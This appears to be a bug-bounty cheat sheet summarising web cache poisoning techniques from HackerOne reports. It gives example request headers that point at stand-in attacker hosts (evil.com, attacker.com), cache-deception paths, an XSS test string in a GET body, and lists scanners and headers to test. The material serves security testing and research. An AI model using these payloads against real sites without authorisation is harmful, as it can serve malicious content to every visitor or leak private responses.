---
name: "h1-cache-poisoning-techniques"
description: "Web Cache Poisoning patterns from HackerOne — unkeyed headers, CORS cache poisoning, cookie-based cache poisoning, Host header poisoning, and Cache Deception"
category: web-security
tags: ["cache-poisoning", "web-cache", "cdn", "host-header", "cache-deception", "hackerone"]
relevance: 9
---

# H1 Web Cache Poisoning Techniques

Real-world Cache Poisoning from HackerOne:

## 1. Unkeyed Header Poisoning
Test headers that might not be part of cache key:
```
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Origin-Url: /evil
X-HTTP-Method-Override: POST
```
If response reflects header value → cache poisoned

## 2. CORS Cache Poisoning
Report: Automattic cache poisoning via CORS ($550)
```
Origin: https://evil.com
```
If `Access-Control-Allow-Origin: https://evil.com` is cached → served to all users

## 3. Cookie-Based Cache Poisoning
Test cookies as unkeyed inputs:
```
Cookie: session=; user=attacker
```
If response varies by cookie → cache private content publicly

## 4. Host Header Cache Poisoning
```
GET / HTTP/1.1
Host: evil.com
```
If response contains `evil.com` in links/scripts → cached for all users on the real host

## 5. Cache Deception
Trick cache into storing sensitive response:
```
GET /api/user/profile
Accept: text/html,application/xhtml+xml
```
Or:
```
GET /api/user/profile/.css
```
Cache sees `.css` extension → caches response containing sensitive data

## 6. Cache Key Injection
```
GET /?cb=123
X-Original-URL: /admin
```
If cache key doesn't include `X-Original-URL` → non-admin users get cached admin response

## 7. Web Cache Poisoning via Fat GET
```
GET /search?q=test
Body: q=<script>alert(1)</script>
```
Some CDNs use GET body as part of response but not cache key

## Detection Tools:
- `Czeczer` - cache poisoning scanner
- Burp Suite + Param Miner for unkeyed param discovery
- Manual: Check `X-Cache`, `CF-Cache-Status`, `Age` headers

## Key Headers to Test:
`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `Origin`, `Referer`, `Accept`, `Cookie`, `Authorization`
